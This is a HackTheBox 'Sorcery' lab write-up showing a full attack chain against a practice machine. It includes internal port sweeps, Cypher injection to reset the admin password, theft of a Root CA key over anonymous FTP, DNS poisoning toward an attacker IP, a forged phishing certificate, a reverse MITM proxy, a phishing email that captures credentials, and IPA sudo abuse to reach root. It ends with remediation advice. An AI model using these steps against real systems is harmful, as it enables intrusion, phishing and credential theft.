# HackTheBox - Sorcery Writeup

**Machine:** Sorcery  
**IP Address:** 10.10.11.67  
**Difficulty:** Hard
**OS:** Linux

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Port Scanning

Initial port scan using rustscan:

```bash
rustscan -a 10.10.11.67 -r 1-65535 --ulimit 5000 -g > rustscan.txt
```

**Open Ports:**

- 22/tcp - SSH
- 443/tcp - HTTPS

### Notes

- Observed possible username: `nicole_sullivan`

### Network Discovery (Container)

Initial sweep for internal services:

```bash
for ip in 172.19.0.{1..10}; do
  for port in 21 22 80 443 3306 9092; do
    (echo > /dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "$ip:$port open"
  done
done
```

**Open Internal Ports:**

- 172.19.0.1:22 (SSH)
- 172.19.0.1:443 (HTTPS)
- 172.19.0.7:9092 (Kafka)
- 172.19.0.8:443 (HTTPS)
- 172.19.0.9:21 (FTP)
- 172.19.0.10:22 (SSH)

Expanded sweep for mail services:

```bash
for ip in 172.19.0.{1..10}; do
  for port in 21 22 80 443 1025 3306 8025 9092; do
    (echo > /dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "$ip:$port open"
  done
done
```

**Additional Internal Services:**

- 172.19.0.4:22 (SSH)
- 172.19.0.5:1025 (SMTP - MailHog)
- 172.19.0.5:8025 (MailHog Web Interface)
- 172.19.0.6:9092 (Kafka)
- 172.19.0.7:443 (HTTPS)
- 172.19.0.9:21 (FTP)

---

## Initial Access

### Neo4j Cypher Injection

Found a Cypher query that updated the admin password hash:

```cypher
MATCH (u:User {username: 'admin'})
SET u.password = '$argon2id$v=19$m=19456,t=2,p=1$+NXJdRvmROS8wUqHriIDGQ$T9o85oMMvUHTHKuTrJFPkKmSOTj1LIsAOyD+SS8SaJw'
RETURN result { .*, description: 'admin password updated' } //
```

### FTP Anonymous Access

Connected to the internal FTP service and retrieved CA material:

```bash
ftp 172.19.0.5 21
```

Credentials: `anonymous` with empty password

**Files Retrieved:**

- `RootCA.crt` - Root CA certificate
- `RootCA.key` - Root CA private key

### DNS Poisoning Setup

Identified a helper script that merges `/dns/hosts` and `/dns/hosts-user` into `/dns/entries`:

```bash
#!/bin/bash
entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")
> $entries_file
for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)
    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
done
```

Added a malicious entry and reloaded dnsmasq:

```bash
echo "10.10.14.53 evil.sorcery.htb" > /dns/hosts-user
killall dnsmasq
```

Process listing confirmed dnsmasq was running with `/dns/hosts-user` and `/dns/hosts`:

```bash
ps aux > /tmp/a
cat /tmp/a
```

### Certificate Generation for Phishing

Used the stolen Root CA key to sign a phishing certificate:

```bash
openssl genrsa -out phishing.key 2048
openssl req -newkey rsa:2048 -nodes -keyout phishing.key -out phishing.csr -subj "/CN=evil.sorcery.htb"
openssl x509 -req -in phishing.csr -CA RootCA.crt -CAkey RootCA.key -CAcreateserial -out phishing.crt -days 365 -sha256
cat phishing.crt phishing.key > phishing.pem
```

### Man-in-the-Middle Attack

Started a reverse MITM proxy to capture credentials:

```bash
sudo ~/.local/bin/mitmproxy --mode reverse:https://git.sorcery.htb/ --certs phishing.pem --save-stream-file traffic.raw -k -p 443
```

### Phishing Email

Delivered a phishing email through MailHog:

```bash
swaks --to tom_summers@sorcery.htb \
  --from texugo@sorcery.htb \
  --server 172.19.0.5 --port 1025 \
  --data "Subject: Hello Tom\n\nHi Tom,\n\nPlease check this link: https://evil.sorcery.htb/user/login\n"
```

**Captured Credentials:**

- Username: `tom_summers`
- Password: `PASS`

Accessed the admin account:

- `tom_summers_admin / PASS`

---

## Privilege Escalation - User

### Process Monitoring with pspy

Captured privileged operations and credentials in process arguments:

```bash
./pspy64 > oi.txt
```

**Key Findings:**

1. **Docker Login (Rebecca Smith):**
```
CMD: UID=0 PID=702888 | sudo -u rebecca_smith /usr/bin/docker login
```

2. **Registry Password Update:**
```
CMD: UID=0 PID=705874 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith PASS
```

3. **Ash Winter Password Modification:**
```
CMD: UID=1638400000 PID=784402 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=PASS
```

### Kerberos and IPA Access

Established an SSH tunnel for LDAP access:

```bash
ssh -L 1389:127.0.0.1:389 tom_summers_admin@10.129.254.47
```

Authenticated as ash_winter:

```bash
kinit ash_winter
klist
```

### IPA Group Membership Modification

Added ash_winter to sysadmins:

```bash
ipa group-add-member sysadmins --user=ash_winter
```

### Sudo Rule Modification

Added ash_winter to allow_sudo:

```bash
ipa sudorule-add-user allow_sudo --user=ash_winter
```

### Switching to Ash Winter

```bash
ksu ash_winter
sudo -l
```

**Initial Permissions:**

```
(root) NOPASSWD: /usr/bin/systemctl restart sssd
```

---

## Privilege Escalation - Root

### SSSD Restart Trigger

Restarted SSSD to apply new sudo rules:

```bash
sudo /usr/bin/systemctl restart sssd
```

Re-authenticated and verified permissions:

```bash
kdestroy
kinit ash_winter
ksu ash_winter
sudo -l
```

**New Permissions:**

```
(root) NOPASSWD: /usr/bin/systemctl restart sssd
(ALL : ALL) ALL
```

### Root Access

```bash
sudo su
```

---

## Key Takeaways

1. Exposed Root CA keys enable attackers to create trusted phishing certificates.
2. Writable DNS configuration allows internal traffic redirection.
3. MITM plus phishing can capture valid user credentials.
4. Process monitoring can expose secrets passed via command-line arguments.
5. Weak IPA/SSSD controls allow privilege escalation through policy changes.

---

## Tools Used

- rustscan
- ftp
- openssl
- mitmproxy
- swaks
- pspy64
- ssh
- kinit/ksu
- ipa
- sudo
- systemctl
- dnsmasq

---

## Flags

**User Flag:** Retrieved after user access (value not recorded in PDF)  
**Root Flag:** Retrieved after root access (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Secure Root CA Private Key**

   - **Issue:** Root CA private key exposed via anonymous FTP access
   - **Impact:** Attackers can sign malicious certificates, enabling MITM attacks
   - **Remediation:**
     - Remove Root CA private keys from all publicly accessible locations
     - Store private keys in hardware security modules (HSM) or secure key management systems
     - Implement strict access controls (principle of least privilege)
     - Rotate the compromised Root CA immediately and revoke all issued certificates
     - Audit all systems that trusted this CA
2. **Disable Anonymous FTP Access**

   - **Issue:** Anonymous FTP enabled with sensitive files
   - **Impact:** Unauthorized access to sensitive cryptographic material
   - **Remediation:**
     - Disable anonymous FTP access entirely
     - Implement authentication mechanisms with strong passwords
     - Use SFTP or SCP instead of FTP for file transfers
     - Apply file integrity monitoring on sensitive directories
3. **Secure DNS Configuration**

   - **Issue:** Writable DNS hosts file allows DNS poisoning
   - **Impact:** Users can be redirected to malicious servers
   - **Remediation:**
     - Restrict write permissions on DNS configuration files
     - Implement file integrity monitoring on DNS configurations
     - Use DNSSEC to prevent DNS spoofing
     - Separate DNS services from user-accessible containers

### High Severity

4. **Process Credential Exposure**

   - **Issue:** Passwords passed as command-line arguments visible in process listings
   - **Impact:** Credentials harvested through process monitoring
   - **Remediation:**
     - Never pass credentials as command-line arguments
     - Use environment variables, configuration files with restricted permissions, or stdin
     - Implement credential vaulting solutions (HashiCorp Vault, AWS Secrets Manager)
     - Restrict access to process listings with appropriate SELinux/AppArmor policies
5. **Insufficient LDAP/IPA Access Controls**

   - **Issue:** Users can modify their own group memberships and sudo rules
   - **Impact:** Privilege escalation to administrative access
   - **Remediation:**
     - Implement role-based access control (RBAC) in IPA/FreeIPA
     - Separate user management permissions from user accounts
     - Require multi-party authorization for privilege modifications
     - Enable comprehensive audit logging for all IPA operations
     - Implement approval workflows for privilege escalations
6. **Email Security Controls**

   - **Issue:** No email filtering, SPF, DKIM, or DMARC validation
   - **Impact:** Successful phishing attacks leading to credential theft
   - **Remediation:**
     - Implement SPF, DKIM, and DMARC for email authentication
     - Deploy email gateway with anti-phishing capabilities
     - Implement link sandboxing and URL rewriting
     - Conduct regular security awareness training for users
     - Deploy multi-factor authentication (MFA) for all user accounts

### Medium Severity

7. **SSL/TLS Certificate Validation**

   - **Issue:** Users trust certificates signed by the internal Root CA without additional validation
   - **Impact:** MITM attacks using fraudulently signed certificates
   - **Remediation:**
     - Implement certificate pinning for critical applications
     - Use certificate transparency monitoring
     - Deploy network intrusion detection systems (NIDS) to detect MITM attacks
     - Implement mutual TLS (mTLS) authentication where possible
8. **Container Security**

   - **Issue:** Containers with excessive permissions and network access
   - **Impact:** Lateral movement and network reconnaissance
   - **Remediation:**
     - Implement container isolation and network segmentation
     - Use Docker user namespaces to prevent privilege escalation
     - Restrict container capabilities using security profiles
     - Implement egress filtering on container networks
     - Regular vulnerability scanning of container images
9. **Password Policy Enforcement**

   - **Issue:** Weak or expired passwords not enforced consistently
   - **Impact:** Compromised accounts through credential capture
   - **Remediation:**
     - Enforce strong password policies (length, complexity, rotation)
     - Implement multi-factor authentication (MFA) for all accounts
     - Use password managers for complex credential management
     - Monitor for compromised credentials using breach databases

### Security Best Practices

10. **Network Segmentation**

    - Implement proper network segmentation between services
    - Use VLANs and firewall rules to restrict lateral movement
    - Apply the principle of least privilege for network access
11. **Monitoring and Logging**

    - Implement centralized logging with SIEM integration
    - Enable audit logging for all privileged operations
    - Set up alerts for suspicious activities (privilege escalations, unusual logins)
    - Retain logs for forensic analysis
12. **Security Awareness Training**

    - Conduct regular phishing simulation exercises
    - Train users to recognize social engineering attempts
    - Establish clear incident reporting procedures
    - Create a security-conscious culture
